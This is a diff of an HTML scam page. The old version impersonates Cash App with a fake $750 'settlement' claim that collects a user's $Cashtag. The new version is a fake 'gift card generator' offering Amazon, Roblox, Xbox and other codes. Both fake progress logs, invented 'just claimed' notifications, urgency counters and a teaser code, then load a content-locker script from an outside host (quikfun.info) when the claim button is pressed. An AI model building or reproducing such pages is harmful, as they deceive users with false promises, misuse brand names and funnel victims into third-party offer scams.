@@ -1,248 +1,297 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QuickSync | Premium Settlement Portal</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --primary: #00D632;
-            --primary-glow: rgba(0, 214, 50, 0.3);
-            --glass: rgba(255, 255, 255, 0.96);
-            --border: rgba(255, 255, 255, 0.7);
-            --error: #ff4d4d;
-            --text-dark: #0f172a;
-            --text-light: #64748b;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Digital Rewards Generator - Claim Your Unused Gift Card 2026</title>
+<meta name="description" content="Access the official USA Digital Rewards Generator. Claim unused gift card allocations for Amazon, Xbox, Roblox, and more. Verified, secure, and instant distribution.">
+<meta name="keywords" content="digital rewards, unused gift cards, gift card generator, USA rewards allocation, claim rewards 2026">
+<meta name="author" content="Digital Rewards Hub">
 
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+<meta property="og:type" content="website">
+<meta property="og:title" content="Claim Your Unused Digital Reward | Official USA Allocation">
+<meta property="og:description" content="Verified unused codes ready for immediate distribution to USA users. Secure your reward allocation today.">
 
-        body {
-            background: #ffffff;
-            background-image: 
-                radial-gradient(at 0% 0%, hsla(134,100%,92%,1) 0, transparent 50%), 
-                radial-gradient(at 100% 0%, hsla(180,100%,95%,1) 0, transparent 50%), 
-                radial-gradient(at 100% 100%, hsla(134,100%,90%,1) 0, transparent 50%);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            overflow-x: hidden;
-        }
-
-        /* --- Social Proof Popup --- */
-        .live-ticker {
-            position: fixed;
-            bottom: 25px;
-            left: 25px;
-            background: white;
-            padding: 14px 20px;
-            border-radius: 14px;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.12);
-            border: 1px solid #f1f5f9;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-size: 13.5px;
-            z-index: 1000;
-            transform: translateX(-150%);
-            transition: transform 0.6s cubic-bezier(0.23, 1, 0.32, 1);
-        }
-        .live-ticker.active { transform: translateX(0); }
-        .ticker-dot { width: 8px; height: 8px; background: var(--primary); border-radius: 50%; }
-
-        /* --- Main Premium Card --- */
-        .glass-card {
-            background: var(--glass);
-            backdrop-filter: blur(40px);
-            border: 1px solid var(--border);
-            border-radius: 35px;
-            width: 100%;
-            max-width: 460px;
-            padding: 50px 40px;
-            box-shadow: 0 40px 100px -20px rgba(0, 0, 0, 0.15);
-            text-align: center;
-            position: relative;
-        }
-
-        .logo-img { height: 55px; width: auto; margin-bottom: 25px; filter: drop-shadow(0 4px 10px rgba(0, 214, 50, 0.2)); }
-
-        /* --- Progress Bar --- */
-        .steps-wrapper { display: flex; justify-content: center; gap: 8px; margin-bottom: 35px; }
-        .step-indicator { flex: 1; height: 4px; background: #e2e8f0; border-radius: 10px; position: relative; overflow: hidden; }
-        .step-indicator::after {
-            content: '';
-            position: absolute;
-            left: 0; top: 0; height: 100%; width: 0%;
-            background: var(--primary);
-            transition: width 0.8s cubic-bezier(0.65, 0, 0.35, 1);
-        }
-        .step-indicator.active::after { width: 100%; }
-
-        /* --- Urgency Bar --- */
-        .urgency-bar {
-            background: rgba(0, 0, 0, 0.04);
-            border-radius: 12px;
-            padding: 12px;
-            margin-bottom: 25px;
-            font-size: 12px;
-            font-weight: 700;
-            color: var(--text-dark);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .spot-count { color: var(--primary); }
-
-        /* --- UI Elements --- */
-        h1 { font-size: 32px; font-weight: 800; letter-spacing: -1.5px; line-height: 1.1; margin-bottom: 12px; color: var(--text-dark); }
-        p.subtitle { color: var(--text-light); font-size: 15px; margin-bottom: 30px; line-height: 1.6; }
-
-        .input-group { position: relative; width: 100%; }
-        input[type="text"] {
-            width: 100%; padding: 22px; background: #f8fafc; border: 2px solid #f1f5f9; border-radius: 20px;
-            font-size: 18px; font-weight: 600; margin-bottom: 15px; text-align: center; transition: 0.3s;
-        }
-        input[type="text"]:focus { outline: none; border-color: var(--primary); background: white; box-shadow: 0 0 0 5px var(--primary-glow); }
-
-        .btn-premium {
-            width: 100%; background: var(--text-dark); color: white; padding: 22px; border: none; border-radius: 20px;
-            font-size: 16px; font-weight: 800; cursor: pointer; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            text-transform: uppercase; letter-spacing: 1px;
-        }
-        .btn-premium:hover { transform: translateY(-3px) scale(1.02); background: #000; box-shadow: 0 20px 40px rgba(0,0,0,0.15); }
-        .btn-success { background: var(--primary); }
-
-        .spinner { width: 45px; height: 45px; border: 3px solid #f1f5f9; border-top-color: var(--primary); border-radius: 50%; animation: spin 0.8s infinite linear; margin: 0 auto 20px; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        
-        .log-badge { font-size: 11px; font-weight: 800; color: var(--primary); letter-spacing: 2px; }
-
-        footer { margin-top: 35px; border-top: 1px solid #f1f5f9; padding-top: 25px; width: 100%; text-align: center; }
-        .badge-row { display: flex; justify-content: center; align-items: center; gap: 20px; opacity: 0.6; margin-bottom: 15px; }
-
-        .hidden { display: none; }
-        .fade-in { animation: fadeIn 0.6s forwards; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
-    </style>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+* { font-family: 'Inter', sans-serif; }
+.gradient-bg { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
+.glass-effect { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.2); }
+.card-glow { box-shadow: 0 0 30px rgba(102, 126, 234, 0.3); }
+.reward-card { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+.reward-card:hover { transform: translateY(-8px) scale(1.02); box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2); }
+.reward-card.selected { transform: translateY(-8px) scale(1.05); box-shadow: 0 0 40px rgba(102, 126, 234, 0.6); border: 2px solid #667eea; }
+.value-btn { transition: all 0.2s ease; }
+.value-btn:hover { transform: scale(1.05); }
+.value-btn.selected { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; transform: scale(1.1); box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4); }
+.progress-step { transition: all 0.5s ease; }
+.progress-step.active { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); box-shadow: 0 0 20px rgba(102, 126, 234, 0.5); }
+.progress-step.completed { background: #10b981; }
+.notification-ticker { animation: slideInRight 0.5s ease, slideOutRight 0.5s ease 4.5s; }
+@keyframes slideInRight { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+@keyframes slideOutRight { from { transform: translateX(0); opacity: 1; } to { transform: translateX(100%); opacity: 0; } }
+@keyframes spin { to { transform: rotate(360deg); } }
+.spinner { animation: spin 1s linear infinite; }
+.pulse { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+@keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+.fade-in { animation: fadeIn 0.6s ease; }
+@keyframes slideUp { from { opacity: 0; transform: translateY(40px); } to { opacity: 1; transform: translateY(0); } }
+.slide-up { animation: slideUp 0.6s ease; }
+.confetti { position: absolute; width: 10px; height: 10px; background: #667eea; animation: confettiFall 3s linear infinite; }
+@keyframes confettiFall { to { transform: translateY(100vh) rotate(360deg); opacity: 0; } }
+.shimmer { background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent); background-size: 200% 100%; animation: shimmer 2s infinite; }
+@keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
+</style>
 </head>
-<body>
+<body class="bg-gray-900 text-white overflow-x-hidden">
 
-    <div id="social-proof" class="live-ticker">
-        <div class="ticker-dot"></div>
-        <div id="p-content">Establishing secure connection...</div>
+<div class="fixed inset-0 gradient-bg opacity-20"></div>
+<div id="notification" class="fixed top-4 right-4 z-50 max-w-sm"></div>
+
+<div class="relative min-h-screen flex flex-col items-center p-4 pt-12">
+
+    <header class="text-center mb-12 fade-in">
+        <h1 class="text-5xl md:text-6xl font-black mb-3 bg-gradient-to-r from-purple-400 via-pink-400 to-blue-400 bg-clip-text text-transparent leading-tight">
+            Claim Your Unused <br> <span class="text-white">Digital Reward</span>
+        </h1>
+        <p class="text-gray-300 text-lg md:text-xl font-light tracking-wide">
+            Verified unused codes ready for <span class="text-green-400 font-semibold">immediate distribution</span> to USA users.
+        </p>
+        <div class="flex items-center justify-center gap-2 mt-6">
+            <div class="flex -space-x-2">
+                <div class="w-8 h-8 rounded-full bg-gradient-to-br from-purple-500 to-pink-500 border-2 border-gray-900 shadow-lg"></div>
+                <div class="w-8 h-8 rounded-full bg-gradient-to-br from-blue-500 to-cyan-500 border-2 border-gray-900 shadow-lg"></div>
+                <div class="w-8 h-8 rounded-full bg-gradient-to-br from-green-500 to-emerald-500 border-2 border-gray-900 shadow-lg"></div>
+            </div>
+            <span class="text-sm text-gray-500 font-medium">12,847 rewards allocated today</span>
+        </div>
+    </header>
+
+    <div class="w-full max-w-3xl mb-12 fade-in">
+        <div class="flex items-center justify-between mb-4">
+            <div class="flex-1 flex items-center">
+                <div id="step1" class="progress-step active w-12 h-12 rounded-full flex items-center justify-center font-bold text-lg z-10 relative bg-gray-700">1</div>
+                <div id="line1" class="progress-line flex-1 h-2 bg-gray-700 mx-2"></div>
+            </div>
+            <div class="flex-1 flex items-center">
+                <div id="step2" class="progress-step w-12 h-12 rounded-full flex items-center justify-center font-bold text-lg z-10 relative bg-gray-700">2</div>
+                <div id="line2" class="progress-line flex-1 h-2 bg-gray-700 mx-2"></div>
+            </div>
+            <div><div id="step3" class="progress-step w-12 h-12 rounded-full flex items-center justify-center font-bold text-lg z-10 relative bg-gray-700">3</div></div>
+        </div>
+        <div class="flex justify-between text-sm text-gray-400 px-2 uppercase font-bold tracking-tighter">
+            <span>Select Reward</span><span>Processing</span><span>Claim Now</span>
+        </div>
     </div>
 
-    <div class="glass-card fade-in">
-        <img src="https://i.ibb.co/C3wm4RhW/logo.png" alt="Cash App" class="logo-img">
-
-        <div class="steps-wrapper">
-            <div id="p-1" class="step-indicator active"></div>
-            <div id="p-2" class="step-indicator"></div>
-            <div id="p-3" class="step-indicator"></div>
-        </div>
-
-        <div id="stage-1" class="fade-in">
-            <div class="urgency-bar">
-                <span>Current Availability:</span>
-                <span class="spot-count">9 Spots Remaining</span>
-            </div>
-            <h1>Claim Settlement</h1>
-            <p class="subtitle">Securely verify your identifier to finalize the <strong>$750.00</strong> promotional sync to your account.</p>
-            <input type="text" id="userHandle" placeholder="Enter $Cashtag Name" autocomplete="off" spellcheck="false">
-            <button class="btn-premium" onclick="validate()">Connect Account</button>
-        </div>
-
-        <div id="stage-2" class="hidden">
-            <div class="spinner"></div>
-            <h1>Syncing Protocol</h1>
-            <p class="subtitle">Establishing a 256-bit encrypted handshake with the primary settlement node.</p>
-            <div class="log-badge" id="log-text">INITIALIZING...</div>
-        </div>
-
-        <div id="stage-3" class="hidden">
-            <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
-            <h1>Settlement Ready</h1>
-            <p class="subtitle">Promotion approved. The <strong>$750.00</strong> allocation is waiting for your final ledger confirmation.</p>
-            <button class="btn-premium btn-success" id="final-btn" onclick="finalize()">Finalize Settlement</button>
-        </div>
-
-        <footer>
-            <div class="badge-row">
-                <svg width="35" height="22" viewBox="0 0 320 200"><circle cx="120" cy="100" r="100" fill="#eb001b" fill-opacity=".9"/><circle cx="200" cy="100" r="100" fill="#f79e1b" fill-opacity=".9"/></svg>
-                <div style="display: flex; align-items: center; gap: 5px; border: 1px solid #e2e8f0; padding: 5px 10px; border-radius: 6px;">
-                    <svg width="10" height="10" viewBox="0 0 24 24" fill="#00D632"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-                    <span style="font-size: 9px; font-weight: 800; color: #64748b;">SSL SECURE</span>
+    <div id="stage1" class="w-full max-w-5xl slide-up">
+        <div class="glass-effect rounded-3xl p-8 md:p-12 card-glow">
+            <h2 class="text-3xl md:text-4xl font-bold mb-8 text-center">Choose Your Reward Package</h2>
+            <div class="grid grid-cols-2 md:grid-cols-5 gap-4 mb-8" id="brandsGrid"></div>
+            <div class="mb-8">
+                <h3 class="text-xl font-semibold mb-4 text-center">Select Denomination</h3>
+                <div class="flex flex-wrap justify-center gap-4" id="valuesContainer">
+                    <button class="value-btn px-8 py-4 rounded-xl bg-gray-800 font-bold text-xl" data-value="25">$25</button>
+                    <button class="value-btn px-8 py-4 rounded-xl bg-gray-800 font-bold text-xl" data-value="50">$50</button>
+                    <button class="value-btn px-8 py-4 rounded-xl bg-gray-800 font-bold text-xl" data-value="100">$100</button>
+                    <button class="value-btn px-8 py-4 rounded-xl bg-gray-800 font-bold text-xl" data-value="250">$250</button>
                 </div>
             </div>
-            <div style="font-size: 10px; color: #94a3b8; font-weight: 600; letter-spacing: 1px;">INSTITUTIONAL GRADE SECURITY</div>
-        </footer>
+            <button id="continueBtn" class="w-full py-5 rounded-xl bg-gradient-to-r from-purple-600 to-blue-600 font-bold text-xl opacity-50 cursor-not-allowed" disabled>Generate My Reward</button>
+        </div>
     </div>
 
-    <script>
-        window.og_autostart = false;
+    <div id="stage2" class="w-full max-w-3xl hidden">
+        <div class="glass-effect rounded-3xl p-8 md:p-12 text-center">
+            <h2 class="text-3xl md:text-4xl font-bold mb-8 text-white">Processing Request</h2>
+            <div class="flex justify-center mb-8"><div class="spinner w-20 h-20 border-4 border-purple-500/30 border-t-purple-500 rounded-full"></div></div>
+            <p id="statusText" class="text-2xl font-semibold text-purple-400 mb-6 pulse">Initializing...</p>
+            <div class="w-full bg-gray-800 rounded-full h-4 mb-6 overflow-hidden"><div id="progressBar" class="h-full bg-purple-600 shimmer" style="width: 0%"></div></div>
+            <div class="bg-gray-900/50 rounded-xl p-4 text-left h-32 overflow-y-auto font-mono text-xs text-green-400" id="techLog"></div>
+        </div>
+    </div>
 
-        // Ticker Logic (Proof)
-        const activities = [
-            "$j***n just claimed $750.00",
-            "$m***e received settlement sync",
-            "$d***k payout approved",
-            "$s***a synchronized $750.00"
-        ];
-        
-        let i = 0;
-        function showProof() {
-            const popup = document.getElementById('social-proof');
-            const content = document.getElementById('p-content');
-            popup.classList.remove('active');
-            setTimeout(() => {
-                content.innerText = activities[i];
-                popup.classList.add('active');
-                i = (i + 1) % activities.length;
-            }, 600);
+    <div id="stage3" class="w-full max-w-3xl hidden">
+        <div class="glass-effect rounded-3xl p-8 md:p-12 card-glow text-center relative overflow-hidden">
+            <div id="confettiContainer" class="absolute inset-0 pointer-events-none"></div>
+            <h2 class="text-4xl font-bold mb-2 text-green-400">Reward Generated!</h2>
+            <p class="text-gray-300 mb-8 font-medium">Your unique digital code is reserved and ready for reveal.</p>
+            <div class="bg-gradient-to-br from-purple-900/50 to-blue-900/50 rounded-2xl p-8 mb-8 border-2 border-purple-500/50" id="rewardDisplay"></div>
+            <div class="text-4xl font-black text-red-500 mb-8" id="countdown">04:59</div>
+            <button id="claimBtn" class="w-full py-6 rounded-xl bg-gradient-to-r from-green-500 to-emerald-600 font-black text-2xl shadow-lg hover:scale-105 transition-all">UNLOCK & CLAIM NOW</button>
+        </div>
+    </div>
+
+    <section class="max-w-4xl w-full mt-24 px-6 text-gray-400 text-sm leading-relaxed mb-12">
+        <h2 class="text-white text-2xl font-bold mb-4">Official USA Digital Rewards Allocation Protocol</h2>
+        <p class="mb-6">Our platform serves as a specialized gateway for identifying and distributing unused digital assets and gift card allocations within the United States.</p>
+        <div class="grid md:grid-cols-3 gap-8 border-t border-gray-800 pt-10">
+            <div><h4 class="text-white font-bold mb-2 uppercase tracking-tighter">Encrypted Protocol</h4><p>AES-256 bit encryption session protection.</p></div>
+            <div><h4 class="text-white font-bold mb-2 uppercase tracking-tighter">Regional Sync</h4><p>Optimized for North American distribution nodes.</p></div>
+            <div><h4 class="text-white font-bold mb-2 uppercase tracking-tighter">Real-time Audits</h4><p>Continuous inventory checks before allocation.</p></div>
+        </div>
+    </section>
+
+    <footer class="w-full py-10 border-t border-gray-800 text-center text-xs text-gray-500">
+        <p>© 2026 Digital Rewards Protocol • USA Regional Distribution</p>
+    </footer>
+</div>
+
+<script>
+const brands = [
+    { name: 'Amazon', logo: 'https://upload.wikimedia.org/wikipedia/commons/4/4a/Amazon_icon.svg' },
+    { name: 'Roblox', logo: 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg' },
+    { name: 'PlayStation', logo: 'https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg' },
+    { name: 'Xbox', logo: 'https://upload.wikimedia.org/wikipedia/commons/f/f9/Xbox_one_logo.svg' },
+    { name: 'Steam', logo: 'https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg' },
+    { name: 'Google Play', logo: 'https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg' },
+    { name: 'Apple', logo: 'https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg' },
+    { name: 'Nintendo', logo: 'https://upload.wikimedia.org/wikipedia/commons/0/0d/Nintendo.svg' },
+    { name: 'Netflix', logo: 'https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg' },
+    { name: 'Spotify', logo: 'https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg' }
+];
+
+const socialProofMessages = [
+    { user: 'Alex***92', brand: 'Amazon', value: '100' },
+    { user: 'Sarah***47', brand: 'Roblox', value: '50' },
+    { user: 'Mike***83', brand: 'PlayStation', value: '250' }
+];
+
+let sB = null, sV = null;
+
+function init() {
+    renderBrands();
+    setupEventListeners();
+    startSocialProof();
+}
+
+function renderBrands() {
+    const grid = document.getElementById('brandsGrid');
+    grid.innerHTML = brands.map(b => `
+        <div class="reward-card glass-effect rounded-2xl p-6 cursor-pointer text-center" data-brand="${b.name}">
+            <div class="mb-3 flex items-center justify-center h-16"><img src="${b.logo}" class="max-h-12 max-w-full object-contain"></div>
+            <div class="font-bold text-lg">${b.name}</div>
+        </div>
+    `).join('');
+}
+
+function setupEventListeners() {
+    document.getElementById('brandsGrid').onclick = (e) => {
+        const card = e.target.closest('.reward-card');
+        if (!card) return;
+        document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('selected'));
+        card.classList.add('selected'); sB = card.dataset.brand; checkBtn();
+    };
+    document.getElementById('valuesContainer').onclick = (e) => {
+        const btn = e.target.closest('.value-btn');
+        if (!btn) return;
+        document.querySelectorAll('.value-btn').forEach(b => b.classList.remove('selected'));
+        btn.classList.add('selected'); sV = btn.dataset.value; checkBtn();
+    };
+    document.getElementById('continueBtn').onclick = () => { if (sB && sV) goToStage(2); };
+    
+    // الحل النهائي والآمن للـ Locker
+    document.getElementById('claimBtn').onclick = function() {
+        if (typeof og_load === 'function') {
+            og_load();
+        } else {
+            window.og_autostart = true;
+            const script = document.createElement('script');
+            script.src = 'https://quikfun.info/cl/js/qnnw94';
+            script.id = 'ogjs';
+            document.head.appendChild(script);
         }
-        setInterval(showProof, 7000);
-        showProof();
+    };
+}
 
-        // Validation
-        function validate() {
-            const input = document.getElementById('userHandle');
-            let handle = input.value.trim();
-            if(!handle.startsWith('$')) handle = '$' + handle;
-            
-            if(handle.length < 4) {
-                input.style.borderColor = "#ff4d4d";
-                return alert('Please enter a valid Cash App name.');
-            }
+function checkBtn() {
+    if (sB && sV) {
+        document.getElementById('continueBtn').disabled = false;
+        document.getElementById('continueBtn').classList.remove('opacity-50', 'cursor-not-allowed');
+    }
+}
 
-            document.getElementById('p-2').classList.add('active');
-            document.getElementById('stage-1').classList.add('hidden');
-            document.getElementById('stage-2').classList.remove('hidden');
-            
-            const logs = ["LOCATING NODE", "VERIFYING TAG", "ENCRYPTING", "READY"];
-            let j = 0;
-            const int = setInterval(() => {
-                if(j < logs.length) document.getElementById('log-text').innerText = logs[j++];
-                else { clearInterval(int); showFinal(); }
-            }, 1000);
-        }
+function goToStage(stage) {
+    document.getElementById('stage1').classList.add('hidden');
+    document.getElementById('stage2').classList.add('hidden');
+    document.getElementById('stage3').classList.add('hidden');
+    const el = document.getElementById(`stage${stage}`);
+    el.classList.remove('hidden'); el.classList.add('slide-up');
+    if (stage === 2) startProcessing();
+    else if (stage === 3) { showReward(); startCountdown(); createConfetti(); }
+    updateProgressBar(stage);
+}
 
-        function showFinal() {
-            document.getElementById('p-3').classList.add('active');
-            document.getElementById('stage-2').classList.add('hidden');
-            document.getElementById('stage-3').classList.remove('hidden');
-        }
+function updateProgressBar(stage) {
+    for (let i = 1; i <= 3; i++) {
+        const step = document.getElementById(`step${i}`);
+        if (i < stage) { step.classList.replace('bg-gray-700', 'completed'); step.innerHTML = '✓'; }
+        else if (i === stage) { step.classList.replace('bg-gray-700', 'active'); }
+    }
+}
 
-        function finalize() {
-            const b = document.getElementById('final-btn');
-            b.disabled = true; b.innerText = "SYNCHRONIZING...";
-            const s = document.createElement('script');
-            s.id = "ogjs"; s.src = "https://quikfun.info/cl/js/pqq9vl";
-            document.head.appendChild(s);
-        }
-    </script>
+function startProcessing() {
+    let stepIndex = 0;
+    const steps = ['Establishing secure link...', 'Syncing USA nodes...', 'Validating allocation...', 'Finalizing...'];
+    const pBar = document.getElementById('progressBar'), sText = document.getElementById('statusText'), log = document.getElementById('techLog');
+    const interval = setInterval(() => {
+        sText.textContent = steps[stepIndex];
+        pBar.style.width = ((stepIndex + 1) * 25) + '%';
+        const entry = document.createElement('div'); entry.textContent = `> ${steps[stepIndex]}`; log.appendChild(entry);
+        stepIndex++;
+        if (stepIndex >= steps.length) { clearInterval(interval); setTimeout(() => goToStage(3), 1000); }
+    }, 1000);
+}
+
+function showReward() {
+    const brand = brands.find(b => b.name === sB);
+    const teaserCode = Math.random().toString(36).substr(2, 4).toUpperCase(); // توليد 4 أحرف عشوائية
+    document.getElementById('rewardDisplay').innerHTML = `
+        <img src="${brand.logo}" class="h-16 mx-auto mb-4 object-contain">
+        <div class="text-4xl font-black mb-2">$${sV} ${sB} CARD</div>
+        <div class="font-mono text-gray-400 mt-2 text-sm tracking-[0.3em] uppercase">
+            STATUS: <span class="text-green-400">RESERVED</span><br>
+            CODE: XXXX-XXXX-<span class="text-white font-bold">${teaserCode}</span>
+        </div>
+    `;
+}
+
+function startCountdown() {
+    let t = 299;
+    const el = document.getElementById('countdown');
+    setInterval(() => {
+        let m = Math.floor(t / 60), s = t % 60;
+        el.textContent = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+        t--;
+    }, 1000);
+}
+
+function createConfetti() {
+    const container = document.getElementById('confettiContainer');
+    for (let i = 0; i < 40; i++) {
+        const c = document.createElement('div');
+        c.className = 'confetti'; c.style.left = Math.random() * 100 + '%';
+        container.appendChild(c);
+    }
+}
+
+function startSocialProof() {
+    let index = 0;
+    setInterval(() => {
+        const container = document.getElementById('notification'), msg = socialProofMessages[index % socialProofMessages.length];
+        const el = document.createElement('div');
+        el.className = 'notification-ticker glass-effect rounded-xl p-4 mb-2 shadow-lg';
+        el.innerHTML = `<div class="flex items-center gap-3"><div class="text-green-400 font-bold">✓</div><div><div class="font-bold text-sm">${msg.user}</div><div class="text-xs text-gray-300">Just claimed a reward</div></div></div>`;
+        container.appendChild(el);
+        setTimeout(() => el.remove(), 5000);
+        index++;
+    }, 8000);
+}
+
+window.addEventListener('DOMContentLoaded', init);
+</script>
 </body>
 </html>
